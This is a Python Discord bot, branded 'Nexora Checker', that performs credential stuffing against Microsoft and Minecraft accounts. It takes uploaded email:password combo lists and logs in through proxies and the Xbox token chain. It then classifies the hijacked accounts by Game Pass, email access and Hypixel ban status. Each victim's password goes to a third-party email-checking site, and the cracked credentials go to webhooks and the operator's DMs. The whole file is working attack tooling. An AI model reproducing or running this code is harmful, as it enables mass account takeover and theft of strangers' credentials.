import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import threading
import time
from datetime import datetime, timezone
import os
import sys
import re
import json
import uuid
import random
import traceback
import warnings
import concurrent.futures
from urllib.parse import quote
from dotenv import load_dotenv
import requests
import urllib3

# ── optional deps ──────────────────────────────────────────────────────
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

try:
    from colorama import Fore
except ImportError:
    class Fore:
        YELLOW = GREEN = RED = MAGENTA = LIGHTMAGENTA_EX = ''
        LIGHTBLUE_EX = LIGHTGREEN_EX = LIGHTRED_EX = ''

try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    minecraft_available = True
except ImportError:
    minecraft_available = False
    print("Warning: Minecraft library not available — ban checking disabled.")

# ── constants ──────────────────────────────────────────────────────────
SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

# ── config ─────────────────────────────────────────────────────────────
class Config:
    def __init__(self):
        self.data = {}
    def set(self, key, value):
        self.data[key] = value
    def get(self, key):
        return self.data.get(key)

config = Config()

def loadconfig_session():
    defaults = {
        'webhook': '', 'bannedwebhook': '', 'unbannedwebhook': '',
        'maxretries': 5,
        'message': 'Email: <email>\nPassword: <password>\nName: <name>',
        'hypixelname': True, 'hypixellevel': True,
        'hypixelfirstlogin': True, 'hypixellastlogin': True,
        'hypixelbwstars': True, 'hypixelsbcoins': True,
        'optifinecape': True, 'access': True,
        'namechange': True, 'lastchanged': True, 'hypixelban': True,
    }
    for k, v in defaults.items():
        config.set(k, v)

# ── proxy helper ───────────────────────────────────────────────────────
def _pick_proxy(proxies_list):
    if not proxies_list:
        return None
    proxy = random.choice(proxies_list)
    if isinstance(proxy, dict):
        return proxy
    return {'http': 'http://' + proxy, 'https': 'http://' + proxy}

# ── MS login ───────────────────────────────────────────────────────────
def ms_login(email, password, proxies_list):
    """
    Returns dict with key 'status': 'HIT' | 'BAD' | '2FA' | 'RETRY'
    On HIT also has 'token' (MS access token) and 'session'.
    """
    try:
        s = requests.Session()
        s.verify = False
        proxy = _pick_proxy(proxies_list)
        if proxy:
            s.proxies.update(proxy)

        # Step 1 — fetch the login page
        r1 = s.get(SFTAG_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)

        post_url = None
        for pat in [r'urlPost\s*:\s*["\']([^"\']+)["\']', r'urlPost":"([^"]+)"']:
            m = re.search(pat, r1.text)
            if m:
                post_url = m.group(1).replace("\\/", "/")
                break

        ppft = None
        for pat in [r'sFTTag\s*:.*?value="([^"]+)"',
                    r'name="PPFT"[^>]*value="([^"]+)"',
                    r'id="i0327"[^>]*value="([^"]+)"']:
            m = re.search(pat, r1.text)
            if m:
                ppft = m.group(1)
                break

        if not post_url or not ppft:
            return {"status": "RETRY"}

        # Step 2 — submit credentials
        body = (
            f"login={quote(email)}&loginfmt={quote(email)}"
            f"&passwd={quote(password)}"
            f"&PPFT={quote(ppft)}&PPSX=PassportR"
            "&i13=0&type=11&LoginOptions=3&i19=197664"
        )
        r2 = s.post(
            post_url, data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "User-Agent": "Mozilla/5.0"},
            allow_redirects=True, timeout=15
        )
        t = r2.text.lower()

        # Bad password / account not found
        if any(x in t for x in [
            "your account or password is incorrect",
            "that microsoft account doesn't exist",
            "we couldn't find an account",
            "sign in to your microsoft account",
        ]):
            return {"status": "BAD"}

        # 2FA
        if any(x in t for x in [
            "identity/confirm", "proofup", "authenticator",
            "verify your identity", "two-step", "2-step",
            "security info", "account.live.com/recover",
            "sms", "consent",
        ]):
            return {"status": "2FA"}

        if "abuse" in t or "blocked" in t:
            return {"status": "BAD"}

        # Step 3 — extract access token from final URL fragment
        # The live.com flow redirects to:
        #   https://login.live.com/oauth20_desktop.srf#access_token=...
        final_url = r2.url

        access_token = None
        # URL fragment (requests follows redirects but loses fragments — check history)
        for resp in list(r2.history) + [r2]:
            loc = resp.headers.get("Location", "")
            m = re.search(r"access_token=([^&#]+)", loc)
            if m:
                access_token = m.group(1)
                break

        # Fallback: scan final URL
        if not access_token:
            m = re.search(r"access_token=([^&#]+)", final_url)
            if m:
                access_token = m.group(1)

        # Fallback: scan response body
        if not access_token:
            m = re.search(r'"access_token"\s*:\s*"([^"]+)"', r2.text)
            if m:
                access_token = m.group(1)

        if not access_token:
            return {"status": "BAD"}

        return {"status": "HIT", "token": access_token, "session": s}

    except Exception:
        return {"status": "RETRY"}

# ── full auth chain ────────────────────────────────────────────────────
def authenticate_session(email, password, proxies_list, stats, fname,
                         maxretries, webhook_url, tries=0):
    try:
        res = ms_login(email, password, proxies_list)

        if res["status"] == "HIT":
            ms_token = res["token"]
            session = res["session"]

            try:
                # Xbox Live — MUST prefix with "d="
                xbl = session.post(
                    "https://user.auth.xboxlive.com/user/authenticate",
                    json={
                        "Properties": {
                            "AuthMethod": "RPS",
                            "SiteName": "user.auth.xboxlive.com",
                            "RpsTicket": f"d={ms_token}",
                        },
                        "RelyingParty": "http://auth.xboxlive.com",
                        "TokenType": "JWT",
                    },
                    headers={"Content-Type": "application/json",
                             "Accept": "application/json"},
                    timeout=15,
                )
                xbl_data = xbl.json()
                xbox_token = xbl_data.get("Token")
                uhs = (xbl_data.get("DisplayClaims", {})
                               .get("xui", [{}])[0]
                               .get("uhs"))

                if not xbox_token or not uhs:
                    _save_valid_mail(email, password, stats, fname)
                    return

                # XSTS
                xsts = session.post(
                    "https://xsts.auth.xboxlive.com/xsts/authorize",
                    json={
                        "Properties": {
                            "SandboxId": "RETAIL",
                            "UserTokens": [xbox_token],
                        },
                        "RelyingParty": "rp://api.minecraftservices.com/",
                        "TokenType": "JWT",
                    },
                    headers={"Content-Type": "application/json",
                             "Accept": "application/json"},
                    timeout=15,
                )
                xsts_data = xsts.json()
                xsts_token = xsts_data.get("Token")

                if not xsts_token:
                    _save_valid_mail(email, password, stats, fname)
                    return

                # Minecraft login
                mc_resp = session.post(
                    "https://api.minecraftservices.com/authentication/login_with_xbox",
                    json={"identityToken": f"XBL3.0 x={uhs};{xsts_token}"},
                    headers={"Content-Type": "application/json"},
                    timeout=15,
                )
                mc_token = mc_resp.json().get("access_token")

                if mc_token:
                    check_mc_session(session, email, password, mc_token,
                                     stats, fname, proxies_list,
                                     maxretries, webhook_url)
                else:
                    _save_valid_mail(email, password, stats, fname)

            except Exception:
                _save_valid_mail(email, password, stats, fname)

        elif res["status"] == "2FA":
            stats["twofa"] += 1
            _write(fname, "2fa.txt", f"{email}:{password}\n")

        else:  # BAD or RETRY exhausted
            stats["bad"] += 1

    except Exception:
        if tries < maxretries:
            authenticate_session(email, password, proxies_list, stats,
                                 fname, maxretries, webhook_url, tries + 1)
        else:
            stats["bad"] += 1

def _save_valid_mail(email, password, stats, fname):
    stats["vm"] = stats.get("vm", 0) + 1
    _write(fname, "Valid_Mail.txt", f"{email}:{password}\n")

def _write(fname, filename, content):
    os.makedirs(f"results/{fname}", exist_ok=True)
    with open(f"results/{fname}/{filename}", "a") as f:
        f.write(content)

# ── MC session check ───────────────────────────────────────────────────
def check_mc_session(session, email, password, token, stats, fname,
                     proxies_list, maxretries, webhook_url):
    try:
        r = session.get(
            "https://api.minecraftservices.com/minecraft/profile",
            headers={"Authorization": f"Bearer {token}"},
            verify=False, timeout=15,
        )
        if r.status_code == 200:
            profile = r.json()
            name = profile.get("name", "N/A")
            capes = (", ".join(c.get("alias", "")
                               for c in profile.get("capes", [])) or "None")
            uuid_str = profile.get("id", "N/A")

            # Entitlements
            ent = session.get(
                "https://api.minecraftservices.com/entitlements/mcstore",
                headers={"Authorization": f"Bearer {token}"},
                verify=False, timeout=15,
            )
            acc_type = "Normal"
            if ent.status_code == 200:
                et = ent.text
                if "product_game_pass_ultimate" in et:
                    acc_type = "Xbox Game Pass Ultimate"
                    stats["xgpu"] = stats.get("xgpu", 0) + 1
                    _write(fname, "XboxGamePassUltimate.txt",
                           f"{email}:{password}\n")
                elif "product_game_pass_pc" in et:
                    acc_type = "Xbox Game Pass"
                    stats["xgp"] = stats.get("xgp", 0) + 1
                    _write(fname, "XboxGamePass.txt",
                           f"{email}:{password}\n")
                elif '"product_minecraft"' not in et:
                    others = []
                    if "product_minecraft_bedrock" in et:
                        others.append("Bedrock")
                    if "product_legends" in et:
                        others.append("Legends")
                    if "product_dungeons" in et:
                        others.append("Dungeons")
                    if others:
                        acc_type = "Other: " + ", ".join(others)
                        stats["other"] = stats.get("other", 0) + 1
                        _write(fname, "Other.txt",
                               f"{email}:{password} | {', '.join(others)}\n")

            cap = Capture(email, password, name, capes, uuid_str, token,
                          acc_type, session, stats, proxies_list, fname,
                          maxretries)
            cap.handle(session, webhook_url)
        else:
            _save_valid_mail(email, password, stats, fname)
    except Exception:
        pass

# ── Capture class ──────────────────────────────────────────────────────
class Capture:
    def __init__(self, email, password, name, capes, mc_uuid, token,
                 acc_type, session, stats, proxies_list, fname, maxretries):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = mc_uuid
        self.token = token
        self.type = acc_type
        self.session = session
        self.stats = stats
        self.proxies_list = proxies_list
        self.fname = fname
        self.maxretries = maxretries
        # optional captures
        self.hypixl = self.level = self.firstlogin = self.lastlogin = None
        self.cape = self.access = self.sbcoins = self.bwstars = None
        self.banned = self.namechanged = self.lastchanged = None

    def getproxy(self):
        return _pick_proxy(self.proxies_list)

    def builder(self):
        msg = (f"Email: {self.email}\nPassword: {self.password}\n"
               f"Name: {self.name}\nCapes: {self.capes}\n"
               f"Account Type: {self.type}")
        for label, val in [
            ("Hypixel", self.hypixl),
            ("Hypixel Level", self.level),
            ("First Hypixel Login", self.firstlogin),
            ("Last Hypixel Login", self.lastlogin),
            ("Optifine Cape", self.cape),
            ("Email Access", self.access),
            ("Hypixel Skyblock Coins", self.sbcoins),
            ("Hypixel Bedwars Stars", self.bwstars),
            ("Can Change Name", self.namechanged),
            ("Last Name Change", self.lastchanged),
        ]:
            if val is not None:
                msg += f"\n{label}: {val}"
        if config.get("hypixelban"):
            msg += f"\nHypixel Banned: {self.banned or 'Unknown'}"
        return msg + "\n============================\n"

    def notify(self, webhook_url):
        try:
            wh = config.get("webhook") or webhook_url
            if not wh or not config.get("message"):
                return
            banned_str = str(self.banned).lower()
            if banned_str == "false" and config.get("unbannedwebhook"):
                wh = config.get("unbannedwebhook")
            elif banned_str not in ("false", "unknown", "none") and config.get("bannedwebhook"):
                wh = config.get("bannedwebhook")
            payload = {
                "content": config.get("message")
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<name>", self.name or "N/A")
                    .replace("<hypixel>", self.hypixl or "N/A")
                    .replace("<level>", self.level or "N/A")
                    .replace("<firstlogin>", self.firstlogin or "N/A")
                    .replace("<lastlogin>", self.lastlogin or "N/A")
                    .replace("<ofcape>", self.cape or "N/A")
                    .replace("<capes>", self.capes or "N/A")
                    .replace("<access>", self.access or "N/A")
                    .replace("<skyblockcoins>", self.sbcoins or "N/A")
                    .replace("<bedwarsstars>", self.bwstars or "N/A")
                    .replace("<banned>", self.banned or "Unknown")
                    .replace("<namechange>", self.namechanged or "N/A")
                    .replace("<lastchanged>", self.lastchanged or "N/A")
                    .replace("<type>", self.type or "N/A"),
                "username": "Nexora Checker",
            }
            requests.post(wh, json=payload, timeout=5)
        except Exception:
            pass

    def handle(self, session, webhook_url):
        if self.name and self.name != "N/A":
            for fn in [self.hypixel, self.optifine, self.full_access,
                       self.namechange, lambda: self.ban(session)]:
                try:
                    fn()
                except Exception:
                    pass
        self.stats["hits"] += 1
        _write(self.fname, "Hits.txt", f"{self.email}:{self.password}\n")
        _write(self.fname, "Capture.txt",
               self.builder() + "\n============================\n")
        self.notify(webhook_url)

    def hypixel(self):
        needs = any(config.get(k) for k in [
            "hypixelname", "hypixellevel", "hypixelfirstlogin",
            "hypixellastlogin", "hypixelbwstars",
        ])
        if not needs:
            return
        tx = requests.get(
            "https://plancke.io/hypixel/player/stats/" + self.name,
            proxies=self.getproxy(),
            headers={"User-Agent": "Mozilla/5.0"},
            verify=False, timeout=15,
        ).text
        patterns = {
            "hypixelname": (r'(?<=og:description" content=").+?(?=")', "hypixl"),
            "hypixellevel": (r"(?<=Level:</b> ).+?(?=<br/><b>)", "level"),
            "hypixelfirstlogin": (r"(?<=<b>First login: </b>).+?(?=<br/><b>)", "firstlogin"),
            "hypixellastlogin": (r"(?<=<b>Last login: </b>).+?(?=<br/>)", "lastlogin"),
            "hypixelbwstars": (r"(?<=<li><b>Level:</b> ).+?(?=</li>)", "bwstars"),
        }
        for cfg_key, (pat, attr) in patterns.items():
            if config.get(cfg_key):
                try:
                    setattr(self, attr, re.search(pat, tx).group())
                except Exception:
                    pass
        if config.get("hypixelsbcoins"):
            try:
                req = requests.get(
                    "https://sky.shiiyu.moe/stats/" + self.name,
                    proxies=self.getproxy(), verify=False, timeout=15,
                )
                self.sbcoins = re.search(r"(?<= Networth: ).+?(?=\n)", req.text).group()
            except Exception:
                pass

    def optifine(self):
        if not config.get("optifinecape"):
            return
        try:
            txt = requests.get(
                f"http://s.optifine.net/capes/{self.name}.png",
                proxies=self.getproxy(), verify=False, timeout=10,
            ).text
            self.cape = "No" if "Not found" in txt else "Yes"
        except Exception:
            self.cape = "Unknown"

    def full_access(self):
        if not config.get("access"):
            return
        try:
            out = requests.get(
                f"https://email.avine.tools/check?email={self.email}&password={self.password}",
                verify=False, timeout=15,
            ).json()
            if out.get("Success") == 1:
                self.access = "True"
                self.stats["mfa"] = self.stats.get("mfa", 0) + 1
                _write(self.fname, "MFA.txt", f"{self.email}:{self.password}\n")
            else:
                self.access = "False"
                self.stats["sfa"] = self.stats.get("sfa", 0) + 1
                _write(self.fname, "SFA.txt", f"{self.email}:{self.password}\n")
        except Exception:
            self.access = "Unknown"

    def namechange(self):
        if not config.get("namechange") and not config.get("lastchanged"):
            return
        for _ in range(self.maxretries):
            try:
                r = requests.get(
                    "https://api.minecraftservices.com/minecraft/profile/namechange",
                    headers={"Authorization": f"Bearer {self.token}"},
                    proxies=self.getproxy(), verify=False, timeout=15,
                )
                if r.status_code == 200:
                    data = r.json()
                    if config.get("namechange"):
                        self.namechanged = str(data.get("nameChangeAllowed", "N/A"))
                    if config.get("lastchanged"):
                        created_at = data.get("createdAt")
                        if created_at:
                            try:
                                dt = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                            except ValueError:
                                dt = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                            dt = dt.replace(tzinfo=timezone.utc)
                            diff = datetime.now(timezone.utc) - dt
                            years = diff.days // 365
                            months = (diff.days % 365) // 30
                            if years > 0:
                                self.lastchanged = f"{years} year(s)"
                            elif months > 0:
                                self.lastchanged = f"{months} month(s)"
                            else:
                                self.lastchanged = f"{diff.days} day(s)"
                    break
                if r.status_code == 429:
                    time.sleep(5)
            except Exception:
                pass

    def ban(self, session):
        if not config.get("hypixelban") or not minecraft_available:
            return
        try:
            auth_token = AuthenticationToken(
                username=self.name,
                access_token=self.token,
                client_token=uuid.uuid4().hex,
            )
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            for _ in range(max(self.maxretries, 3)):
                conn = Connection(
                    "alpha.hypixel.net", 25565,
                    auth_token=auth_token,
                    initial_version=47,
                    allowed_versions={"1.8", 47},
                )

                @conn.listener(clientbound.login.DisconnectPacket, early=True)
                def on_disconnect(packet):
                    try:
                        data = json.loads(str(packet.json_data))
                        if "banned" in str(data).lower() or "suspicious activity" in str(data).lower():
                            self.banned = "True"
                            self.stats["banned_count"] = self.stats.get("banned_count", 0) + 1
                            _write(self.fname, "Banned.txt",
                                   f"{self.email}:{self.password}\n")
                        else:
                            self.banned = "False"
                            self.stats["unbanned"] = self.stats.get("unbanned", 0) + 1
                            _write(self.fname, "Unbanned.txt",
                                   f"{self.email}:{self.password}\n")
                    except Exception:
                        self.banned = "False"

                try:
                    conn.connect()
                    time.sleep(1)
                    try:
                        conn.disconnect()
                    except Exception:
                        pass
                except Exception:
                    pass

                if self.banned is not None:
                    break
        except Exception:
            pass

# ── proxy scraper ──────────────────────────────────────────────────────
def scrape_proxies():
    proxies = []
    for url in [
        "https://api.proxyscrape.com/v3/free-proxy-list/get"
        "?request=getproxies&protocol=http&timeout=15000"
        "&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    ]:
        try:
            proxies.extend(requests.get(url, timeout=15).text.splitlines())
        except Exception:
            pass
    return list({p.strip() for p in proxies if p.strip()})

# ── Discord bot ────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="/", intents=intents)
synced_commands = False
active_checkers: dict = {}

class CheckerSession:
    def __init__(self, ctx, threads, proxy_type, combos_file,
                 proxies_file=None, webhook_url=None):
        self.ctx = ctx
        self.threads = threads
        self.proxy_type = proxy_type
        self.combos_file = combos_file
        self.proxies_file = proxies_file
        self.webhook_url = webhook_url
        self.session_id = str(ctx.id)
        self.is_running = True
        self.combos: list = []
        self.proxies: list = []
        self.fname = ""
        self.maxretries = 5
        self.stats = {
            "checked": 0, "total": 0, "hits": 0, "bad": 0, "twofa": 0,
            "sfa": 0, "mfa": 0, "xgp": 0, "xgpu": 0, "other": 0,
            "vm": 0, "errors": 0, "retries": 0,
            "unbanned": 0, "banned_count": 0,
            "start_time": datetime.now(),
        }
        self._lock = threading.Lock()

    # ── stat helpers (thread-safe) ─────────────────────────────────────
    def _inc(self, key, n=1):
        with self._lock:
            self.stats[key] = self.stats.get(key, 0) + n

    # ── status embeds ──────────────────────────────────────────────────
    def _elapsed(self):
        elapsed = datetime.now() - self.stats["start_time"]
        h, rem = divmod(int(elapsed.total_seconds()), 3600)
        m, s = divmod(rem, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    async def send_status_update(self):
        if not self.is_running:
            return
        pct = (self.stats["checked"] / self.stats["total"] * 100
               if self.stats["total"] else 0)
        embed = discord.Embed(
            title="🔍 Checker Status",
            color=discord.Color.blue(),
            timestamp=datetime.now(),
        )
        embed.add_field(
            name="Progress",
            value=f"`{self.stats['checked']}/{self.stats['total']}` ({pct:.1f}%)",
            inline=True,
        )
        embed.add_field(
            name="Results",
            value=(f"✅ Hits: `{self.stats['hits']}`\n"
                   f"❌ Bad: `{self.stats['bad']}`\n"
                   f"🔐 2FA: `{self.stats['twofa']}`"),
            inline=True,
        )
        embed.add_field(
            name="Account Types",
            value=(f"🎮 SFA: `{self.stats['sfa']}`\n"
                   f"🔓 MFA: `{self.stats['mfa']}`\n"
                   f"📧 Valid Mail: `{self.stats['vm']}`"),
            inline=True,
        )
        embed.add_field(
            name="Xbox & Other",
            value=(f"🎯 XGP: `{self.stats['xgp']}`\n"
                   f"⚡ XGPU: `{self.stats['xgpu']}`\n"
                   f"📦 Other: `{self.stats['other']}`"),
            inline=True,
        )
        embed.add_field(
            name="Ban Status",
            value=(f"🟢 Unbanned: `{self.stats['unbanned']}`\n"
                   f"🔴 Banned: `{self.stats['banned_count']}`"),
            inline=True,
        )
        embed.add_field(
            name="Technical",
            value=(f"🔄 Retries: `{self.stats['retries']}`\n"
                   f"❓ Errors: `{self.stats['errors']}`\n"
                   f"⏱️ {self._elapsed()}"),
            inline=True,
        )
        embed.set_footer(text=f"Session ID: {self.session_id}")
        try:
            await self.ctx.send(embed=embed)
        except Exception:
            pass

    async def send_final_summary(self, title="🏁 Checker Completed"):
        done = self.stats["checked"] >= self.stats["total"]
        embed = discord.Embed(
            title=title,
            color=discord.Color.green() if done else discord.Color.orange(),
            timestamp=datetime.now(),
        )
        embed.description = (
            f"**Completed** — All {self.stats['total']} accounts checked"
            if done else
            f"**Stopped** — {self.stats['checked']}/{self.stats['total']} checked"
        )
        embed.add_field(
            name="Final Results",
            value=(f"✅ **Hits**: `{self.stats['hits']}`\n"
                   f"❌ **Bad**: `{self.stats['bad']}`\n"
                   f"🔐 **2FA**: `{self.stats['twofa']}`\n"
                   f"🎮 **SFA**: `{self.stats['sfa']}`\n"
                   f"🔓 **MFA**: `{self.stats['mfa']}`"),
            inline=True,
        )
        embed.add_field(
            name="Account Types",
            value=(f"🎯 **XGP**: `{self.stats['xgp']}`\n"
                   f"⚡ **XGPU**: `{self.stats['xgpu']}`\n"
                   f"📦 **Other**: `{self.stats['other']}`\n"
                   f"📧 **Valid Mail**: `{self.stats['vm']}`"),
            inline=True,
        )
        embed.add_field(
            name="Ban Status",
            value=(f"🟢 **Unbanned**: `{self.stats['unbanned']}`\n"
                   f"🔴 **Banned**: `{self.stats['banned_count']}`"),
            inline=True,
        )
        embed.add_field(
            name="Statistics",
            value=(f"⏱️ **Duration**: {self._elapsed()}\n"
                   f"📊 **Total**: `{self.stats['total']}`\n"
                   f"🔍 **Checked**: `{self.stats['checked']}`\n"
                   f"❓ **Errors**: `{self.stats['errors']}`"),
            inline=True,
        )
        embed.set_footer(text=f"Session ID: {self.session_id}")
        await self.ctx.send(embed=embed)

    async def send_results_to_dm(self):
        file_types = {
            "Hits.txt": "✅ Hits",
            "Capture.txt": "📋 Full Captures",
            "2fa.txt": "🔐 2FA Accounts",
            "SFA.txt": "🎮 SFA Accounts",
            "MFA.txt": "🔓 MFA Accounts",
            "Banned.txt": "🔴 Banned Accounts",
            "Unbanned.txt": "🟢 Unbanned Accounts",
            "XboxGamePass.txt": "🎯 Xbox Game Pass",
            "XboxGamePassUltimate.txt": "⚡ Xbox Game Pass Ultimate",
            "Other.txt": "📦 Other",
            "Valid_Mail.txt": "📧 Valid Mail",
        }
        results_dir = f"results/{self.fname}"
        try:
            user = self.ctx.author
            dm = await user.create_dm()

            # summary embed
            elapsed = datetime.now() - self.stats["start_time"]
            h, rem = divmod(int(elapsed.total_seconds()), 3600)
            m, s = divmod(rem, 60)
            embed = discord.Embed(
                title="📊 Checker Results",
                description=f"Session `{self.session_id[:8]}...` completed",
                color=discord.Color.green(),
            )
            embed.add_field(name="Hits", value=str(self.stats["hits"]), inline=True)
            embed.add_field(name="Bad", value=str(self.stats["bad"]), inline=True)
            embed.add_field(name="2FA", value=str(self.stats["twofa"]), inline=True)
            embed.add_field(name="Duration",
                            value=f"{h:02d}:{m:02d}:{s:02d}", inline=True)
            await dm.send(embed=embed)

            # files
            sent = False
            if os.path.exists(results_dir):
                for filename, desc in file_types.items():
                    fp = os.path.join(results_dir, filename)
                    if os.path.exists(fp) and os.path.getsize(fp) > 0:
                        try:
                            await dm.send(
                                f"**{desc}** — `{filename}`",
                                file=discord.File(fp, filename=filename),
                            )
                            sent = True
                        except Exception:
                            pass
            if not sent:
                await dm.send("⚠️ No result files were generated.")

            await self.ctx.send("📬 Results sent to your DMs!")

        except discord.Forbidden:
            # DMs disabled — fall back to channel
            await self.ctx.send(
                "⚠️ Couldn't DM you (DMs disabled). Sending here instead."
            )
            if os.path.exists(results_dir):
                for filename, desc in file_types.items():
                    fp = os.path.join(results_dir, filename)
                    if os.path.exists(fp) and os.path.getsize(fp) > 0:
                        try:
                            await self.ctx.send(
                                f"**{desc}**",
                                file=discord.File(fp, filename=filename),
                            )
                        except Exception:
                            pass
        except Exception as e:
            print(f"Error sending DM results: {e}")

    # ── checker runner ─────────────────────────────────────────────────
    async def run_checker(self):
        try:
            loadconfig_session()

            with open(self.combos_file, "r", encoding="utf-8", errors="ignore") as f:
                self.combos = list({
                    l.strip() for l in f
                    if l.strip() and ":" in l
                })

            if not self.combos:
                await self.ctx.send("❌ No valid combos found!")
                return

            self.stats["total"] = len(self.combos)
            self.maxretries = config.get("maxretries") or 5
            self.fname = f"discord_check_{self.session_id}"
            os.makedirs(f"results/{self.fname}", exist_ok=True)

            if self.proxy_type in ["'1'", "'2'", "'3'"] and self.proxies_file:
                with open(self.proxies_file, "r", encoding="utf-8",
                          errors="ignore") as f:
                    self.proxies = [l.strip().split()[0] for l in f if l.strip()]

            if self.proxy_type == "'5'":
                await self.ctx.send("🔄 Scraping proxies...")
                self.proxies = scrape_proxies()
                if not self.proxies:
                    await self.ctx.send(
                        "❌ Failed to scrape proxies. Switching to proxyless."
                    )
                    self.proxy_type = "'4'"

            embed = discord.Embed(
                title="🚀 Checker Started",
                color=discord.Color.green(),
                description=f"Checking {self.stats['total']} accounts with {self.threads} threads",
            )
            embed.add_field(name="Session ID", value=self.session_id, inline=True)
            await self.ctx.send(embed=embed)

            asyncio.create_task(self.status_loop())

            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, self._run_checker_blocking)

            await self.send_final_summary("🏁 Checker Completed")
            await self.send_results_to_dm()

        except Exception as e:
            await self.ctx.send(f"❌ Checker error: {e}")
            traceback.print_exc()
        finally:
            active_checkers.pop(self.session_id, None)
            for fp in [self.combos_file,
                       self.proxies_file if self.proxies_file else None]:
                try:
                    if fp and os.path.exists(fp):
                        os.remove(fp)
                except Exception:
                    pass

    def _run_checker_blocking(self):
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=self.threads
        ) as executor:
            futures = {
                executor.submit(self._check_single_combo, combo): combo
                for combo in self.combos
                if self.is_running
            }
            for future in concurrent.futures.as_completed(futures):
                if not self.is_running:
                    break
                try:
                    future.result()
                except Exception:
                    with self._lock:
                        self.stats["errors"] += 1

    def _check_single_combo(self, combo):
        if not self.is_running:
            return
        try:
            parts = combo.strip().split(":")
            email = parts[0]
            password = ":".join(parts[1:]) if len(parts) > 2 else parts[1]
            if email and password:
                authenticate_session(
                    email, password, self.proxies, self.stats,
                    self.fname, self.maxretries, self.webhook_url,
                )
            else:
                with self._lock:
                    self.stats["bad"] += 1
        except Exception:
            with self._lock:
                self.stats["bad"] += 1
        finally:
            with self._lock:
                self.stats["checked"] += 1

    def get_proxy_type_name(self):
        return {
            "'1'": "HTTP", "'2'": "SOCKS4", "'3'": "SOCKS5",
            "'4'": "None", "'5'": "Auto Scraper",
        }.get(self.proxy_type, "Unknown")

    async def status_loop(self):
        while self.is_running and self.stats["checked"] < self.stats["total"]:
            await asyncio.sleep(10)
            await self.send_status_update()

# ── bot events & commands ──────────────────────────────────────────────
@bot.event
async def on_ready():
    global synced_commands
    print(f"🤖 {bot.user} logged in!")
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=".gg/vaultcore Stocks",
        ),
    )
    if not synced_commands:
        try:
            synced = await bot.tree.sync()
            synced_commands = True
            print(f"✅ Synced {len(synced)} slash command(s)")
        except Exception as e:
            print(f"❌ Sync failed: {e}")

@bot.event
async def on_connect():
    loadconfig_session()

@bot.tree.command(name="check", description="Start checking Minecraft accounts")
@app_commands.describe(
    threads="Number of threads (1–50)",
    proxy_type="1=HTTP, 2=SOCKS4, 3=SOCKS5, 4=None, 5=Auto",
    webhook_url="Optional webhook URL for hits",
)
async def check(interaction: discord.Interaction,
                threads: int,
                proxy_type: str,
                webhook_url: str = None):
    await interaction.response.defer()

    if not 1 <= threads <= 50:
        await interaction.followup.send("❌ Threads must be between 1 and 50")
        return

    proxy_map = {
        "1": "'1'", "http": "'1'",
        "2": "'2'", "socks4": "'2'",
        "3": "'3'", "socks5": "'3'",
        "4": "'4'", "none": "'4'",
        "5": "'5'", "auto": "'5'",
    }
    mapped = proxy_map.get(proxy_type.lower())
    if not mapped:
        await interaction.followup.send(
            "❌ Invalid proxy type. Use: `1` HTTP, `2` SOCKS4, `3` SOCKS5, `4` None, `5` Auto"
        )
        return

    embed = discord.Embed(
        title="🔧 Checker Setup",
        description="Upload your combos file to start",
        color=discord.Color.blue(),
    )
    embed.add_field(name="Threads", value=str(threads), inline=True)
    embed.add_field(name="Proxy Type", value=proxy_type, inline=True)
    embed.add_field(name="Webhook", value=webhook_url or "Not set", inline=True)
    await interaction.followup.send(embed=embed)
    await interaction.followup.send(
        "📁 **Upload your combos file now** (`.txt`, `email:password` format):"
    )

    def is_txt_from_user(msg):
        return (
            msg.author == interaction.user
            and msg.channel == interaction.channel
            and msg.attachments
            and msg.attachments[0].filename.endswith(".txt")
        )

    try:
        att_msg = await bot.wait_for("message", check=is_txt_from_user, timeout=60.0)
        data = await att_msg.attachments[0].read()
        combos_path = f"temp_combos_{interaction.id}.txt"
        with open(combos_path, "wb") as f:
            f.write(data)
        lines = [l for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
        if not lines:
            await interaction.followup.send("❌ Combos file is empty.")
            os.remove(combos_path)
            return
        try:
            await att_msg.delete()
        except Exception:
            pass
        await interaction.followup.send(f"✅ **Combos loaded**: {len(lines)} accounts")
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ Upload timed out.")
        return
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}")
        return

    proxies_path = None
    if mapped not in ("'4'", "'5'"):
        await interaction.followup.send(
            "🌐 **Optional**: Upload proxies file or type `skip`:"
        )

        def is_proxy_or_skip(msg):
            return (
                msg.author == interaction.user
                and msg.channel == interaction.channel
                and (
                    (msg.attachments and msg.attachments[0].filename.endswith(".txt"))
                    or msg.content.lower().strip() in ("skip", "no", "none")
                )
            )

        try:
            prx_msg = await bot.wait_for("message", check=is_proxy_or_skip, timeout=30.0)
            if prx_msg.attachments:
                prx_data = await prx_msg.attachments[0].read()
                proxies_path = f"temp_proxies_{interaction.id}.txt"
                with open(proxies_path, "wb") as f:
                    f.write(prx_data)
                try:
                    await prx_msg.delete()
                except Exception:
                    pass
                await interaction.followup.send("✅ **Proxies loaded**")
            else:
                await interaction.followup.send("ℹ️ Continuing without proxies.")
        except asyncio.TimeoutError:
            await interaction.followup.send("ℹ️ Continuing without proxies.")

